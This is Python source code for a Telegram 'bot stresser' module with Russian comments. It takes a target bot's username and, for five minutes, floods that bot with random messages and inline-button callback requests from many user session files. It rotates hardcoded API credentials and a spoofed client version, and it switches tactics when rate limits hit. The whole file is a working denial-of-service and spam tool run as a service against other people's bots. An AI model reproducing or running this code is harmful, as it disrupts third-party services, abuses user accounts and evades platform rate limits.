"""
Brown V2 | bot_stress.py
Стрессер ботов через спам GetBotCallbackAnswerRequest (нажатие inline кнопок).
Флоу:
  1. Одна сессия шлёт /start → парсим inline кнопки из ответа
  2. Если кнопок нет → ошибка, отмена
  3. Все сессии 5 минут одновременно спамят callback на найденную кнопку
"""

import asyncio
import os
import random
import time

from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest, SendMessageRequest
from telethon.tl.types import ReplyInlineMarkup, KeyboardButtonCallback

import config
from config import bot_logs
import keyboards
from utils import esc_md

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
    '29840977:e20b6a9fd01cc9055de0a88a183a030b',
    '29412963:3e37e1d05422db9426aa85e617b441ea',
    '23140129:431e5e839aecf4abdce22d7663acffa7',
]

STRESS_DURATION = 5 * 60  # 5 минут в секундах

bot = None
main_bot = None
session_folder = 'sessions'
os.makedirs(session_folder, exist_ok=True)


def _get_sessions():
    """Читает список сессий динамически при каждом запуске."""
    return [f.replace('.session', '') for f in os.listdir(session_folder) if f.endswith('.session')]


def set_bot_stress(b):
    global bot, main_bot
    bot = b
    if main_bot is None:
        main_bot = b


def _get_client(session: str) -> TelegramClient:
    api_str = random.choice(API)
    api_id, api_hash = api_str.split(':', 1)
    return TelegramClient(
        f"./sessions/{session}", int(api_id), api_hash,
        system_version='4.16.30-vxCUSTOM'
    )


async def find_inline_button(bot_username: str) -> tuple[int | None, bytes | None]:
    """
    Одна сессия шлёт /start боту и ищет первую inline кнопку.
    Перебирает сессии пока не найдёт свободную.
    """
    from telethon.errors import AuthKeyDuplicatedError

    for session in _get_sessions():
        api_str = random.choice(API)
        api_id, api_hash = api_str.split(':', 1)
        client = TelegramClient(
            f"./sessions/{session}", int(api_id), api_hash,
            system_version='4.16.30-vxCUSTOM'
        )
        try:
            connected = False
            for _a in range(3):
                try:
                    await asyncio.wait_for(client.connect(), timeout=12)
                    connected = True
                    break
                except (asyncio.TimeoutError, OSError):
                    if _a == 2:
                        break
                    await asyncio.sleep(1)
            if not connected:
                continue
            if not await client.is_user_authorized():
                await client.disconnect()
                continue

            peer = await client.get_entity(bot_username)
            await client(SendMessageRequest(peer=peer, message='/start', random_id=random.randint(1, 2**31)))
            await asyncio.sleep(2)

            messages = await client.get_messages(peer, limit=5)
            for msg in messages:
                if msg.reply_markup and isinstance(msg.reply_markup, ReplyInlineMarkup):
                    for row in msg.reply_markup.rows:
                        for btn in row.buttons:
                            if isinstance(btn, KeyboardButtonCallback):
                                print(f"[STRESS] Найдена кнопка: '{btn.text}' data={btn.data!r}", flush=True)
                                await client.disconnect()
                                return msg.id, btn.data

            await client.disconnect()
            return None, None

        except AuthKeyDuplicatedError:
            print(f"[STRESS] [{session}] занята другим процессом, пробуем следующую...", flush=True)
            try:
                await client.disconnect()
            except Exception:
                pass
            continue
        except Exception as e:
            print(f"[STRESS] Ошибка поиска кнопок: {e}", flush=True)
            try:
                await client.disconnect()
            except Exception:
                pass
            return None, None

    print(f"[STRESS] Все сессии заняты", flush=True)
    return None, None


async def _spam_callback_session(session: str, bot_username: str, msg_id: int, btn_data: bytes, stop_event: asyncio.Event):
    """
    Одна сессия: шлёт рандомные сообщения боту.
    При FloodWait — переключается на callback спам (не флудит).
    """
    client = _get_client(session)
    count_msg = 0
    count_cb = 0
    errors = 0
    use_callback = False  # флаг — переключились на callback
    try:
        connected = False
        for _a in range(3):
            try:
                await asyncio.wait_for(client.connect(), timeout=12)
                connected = True
                break
            except (asyncio.TimeoutError, OSError):
                if _a == 2:
                    print(f"[STRESS] [{session}] ❌ ОШИБКА СОЕДИНЕНИЯ", flush=True)
                    return 0
                await asyncio.sleep(1)
        if not connected:
            return 0
        if not await client.is_user_authorized():
            print(f"[STRESS] [{session}] ❌ НЕВАЛИД", flush=True)
            return 0

        await client.start()
        peer = await client.get_entity(bot_username)
        print(f"[STRESS] [{session}] ✅ Старт message-спама...", flush=True)
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'

        while not stop_event.is_set():
            if use_callback:
                # Режим callback — не флудит, продолжает нагружать бота
                try:
                    await client(GetBotCallbackAnswerRequest(
                        peer=peer, msg_id=msg_id, data=btn_data
                    ))
                    count_cb += 1
                    if count_cb % 30 == 0:
                        print(f"[STRESS] [{session}] 📥 cb-режим: {count_cb}", flush=True)
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                except Exception:
                    await asyncio.sleep(0.3)
                # Без задержки в callback режиме
            else:
                # Основной режим — сообщения
                try:
                    text = ''.join(random.choices(chars, k=random.randint(4, 12)))
                    await client(SendMessageRequest(
                        peer=peer, message=text,
                        random_id=random.randint(1, 2**31)
                    ))
                    count_msg += 1
                    if count_msg % 20 == 0:
                        print(f"[STRESS] [{session}] 📨 {count_msg} сообщений", flush=True)
                    await asyncio.sleep(0.5)
                except FloodWaitError as e:
                    print(f"[STRESS] [{session}] 🌊 FLOOD {e.seconds}s — переключаемся на callback", flush=True)
                    use_callback = True  # переключаемся навсегда в этой сессии
                    await asyncio.sleep(2)
                except Exception as e:
                    errors += 1
                    if errors <= 3:
                        print(f"[STRESS] [{session}] ⚠️ #{errors}: {str(e)[:50]}", flush=True)
                    await asyncio.sleep(1)

    except Exception as e:
        print(f"[STRESS] [{session}] ❌ КРИТИЧЕСКАЯ: {str(e)[:60]}", flush=True)
    finally:
        if client.is_connected():
            await client.disconnect()

    print(f"[STRESS] [{session}] 🏁 msg:{count_msg} | cb:{count_cb} | err:{errors}", flush=True)
    return count_msg + count_cb


async def main_bot_stress(bot_username: str, user_id: int, username: str, is_admin: bool, notify_bot=None):
    """Главная функция стрессера — ротация сессий по 2 за раз, 3 сообщения в секунду."""
    _notify = notify_bot or bot
    print(f"\n{'='*50}", flush=True)
    print(f"[STRESS] 🚀 Стрессер запущен", flush=True)
    print(f"[STRESS] 🎯 Цель: {bot_username}", flush=True)
    print(f"[STRESS] 👤 Пользователь: {user_id} (*@{username}*)", flush=True)
    print(f"{'='*50}", flush=True)

    # Шаг 1: найти inline кнопку
    print(f"[STRESS] 🔍 Ищем inline кнопки...", flush=True)
    msg_id, btn_data = await find_inline_button(bot_username)

    if not msg_id or not btn_data:
        print(f"[STRESS] ❌ Inline кнопки не найдены", flush=True)
        from aiogram import types as aiogram_types
        await _notify.send_message(
            user_id,
            "❌ *У этого бота нет inline кнопок!*\n*Стрессер работает только с ботами у которых есть кнопки.*",
            parse_mode="Markdown",
            reply_markup=keyboards.main_menu
        )
        return False

    print(f"[STRESS] ✅ Кнопка найдена, запускаем ротационную атаку на {STRESS_DURATION//60} минут...", flush=True)
    print(f"[STRESS] 📦 Сессий: {len(_get_sessions())} | msg_id={msg_id} | btn_data={btn_data!r}", flush=True)
    await _notify.send_message(
        user_id,
        f"⚡️ *Стрессер запущен!*\n*└─ Цель: {bot_username}*\n*└─ Продолжительность: 5 минут*\n*└─ Ротация 2 сессии/сек × 3 сообщения*",
        parse_mode="Markdown"
    )

    # Шаг 2: ротационный спам — 2 активные сессии каждую секунду
    stop_time = time.time() + STRESS_DURATION
    total_sent = 0
    session_index = 0
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'

    # Подключаем все сессии заранее
    clients = {}
    peers = {}
    print(f"[STRESS] 🔌 Подключаем сессии...", flush=True)
    for s in _get_sessions():
        api_str = random.choice(API)
        api_id, api_hash = api_str.split(':', 1)
        c = TelegramClient(f"./sessions/{s}", int(api_id), api_hash,
                           system_version='4.16.30-vxCUSTOM')
        try:
            await asyncio.wait_for(c.connect(), timeout=6)
            if await c.is_user_authorized():
                peers[s] = await c.get_entity(bot_username)
                clients[s] = c
        except Exception:
            try:
                if c.is_connected():
                    await c.disconnect()
            except Exception:
                pass

    valid_sessions = list(clients.keys())
    print(f"[STRESS] ✅ Подключено {len(valid_sessions)} валидных сессий", flush=True)

    if not valid_sessions:
        await _notify.send_message(user_id, "❌ *Нет валидных сессий!*", parse_mode="Markdown", reply_markup=keyboards.main_menu)
        return False

    # Сессии на удаление собираем в set, чтобы избежать race condition при параллельном remove
    sessions_to_remove = set()

    async def send_from_session(s: str):
        nonlocal total_sent
        if s in sessions_to_remove:
            return
        c = clients[s]
        peer = peers[s]
        for _ in range(3):
            try:
                text = ''.join(random.choices(chars, k=random.randint(4, 10)))
                await c(SendMessageRequest(peer=peer, message=text, random_id=random.randint(1, 2**31)))
                total_sent += 1
            except FloodWaitError as e:
                print(f"[STRESS] [{s}] 🌊 FLOOD {e.seconds}s — убираем из ротации", flush=True)
                sessions_to_remove.add(s)
                return
            except Exception:
                pass

    while time.time() < stop_time and valid_sessions:
        # Очищаем помеченные сессии
        if sessions_to_remove:
            for s in sessions_to_remove:
                if s in valid_sessions:
                    valid_sessions.remove(s)
            sessions_to_remove.clear()
            if not valid_sessions:
                break
        # Берём 2 сессии по кругу
        active = []
        for _ in range(2):
            if valid_sessions:
                active.append(valid_sessions[session_index % len(valid_sessions)])
                session_index += 1

        # Параллельно шлём 3 сообщения от каждой
        await asyncio.gather(*[send_from_session(s) for s in active], return_exceptions=True)

        elapsed = int(stop_time - time.time())
        if total_sent % 30 == 0:
            print(f"[STRESS] 📊 Отправлено: {total_sent} | Осталось: {elapsed}s | Активных сессий: {len(valid_sessions)}", flush=True)

        await asyncio.sleep(1)

    # Отключаем все сессии
    for s, c in clients.items():
        try:
            if c.is_connected():
                await c.disconnect()
        except Exception:
            pass

    print(f"\n[STRESS] {'='*50}", flush=True)
    print(f"[STRESS] 🏁 Итог: {total_sent} сообщений за {STRESS_DURATION//60} минут", flush=True)
    print(f"[STRESS] {'='*50}\n", flush=True)

    _log_bot = main_bot or bot
    await _log_bot.send_message(
        bot_logs,
        f"⚡️ *Стрессер завершён*\n"
        f"*└─ Цель: {bot_username}*\n"
        f"*└─ Сообщений отправлено: {total_sent}*\n"
        f"*└─ Пользователь: {user_id} (*@{username}*)*",
        parse_mode="Markdown"
    )
    await _notify.send_message(
        user_id,
        f"✅ *Стрессер завершён!*\n*└─ Отправлено {total_sent} сообщений за 5 минут*",
        parse_mode="Markdown",
        reply_markup=keyboards.main_menu
    )
    return True
